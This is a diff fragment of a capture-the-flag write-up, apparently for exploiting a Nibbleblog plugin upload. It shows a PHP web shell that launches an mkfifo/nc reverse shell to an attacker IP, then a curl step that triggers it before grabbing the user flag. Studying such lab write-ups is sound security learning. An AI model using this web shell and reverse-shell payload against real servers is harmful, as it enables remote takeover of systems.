@@ -88,7 +88,13 @@ Documentation: http://docs.nibbleblog.com
 <?php system ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.27 9001 >/tmp/f'); ?>
 ```
 
+#### Set up listener and curl the page the shell saved to
+```bash
+curl http:/10.129.122.215/nibbleblog/content/private/plugins/my_image/image.php
 
+```
+
+- Grab `user.txt` flag fro
 
 
 ## Techniques used
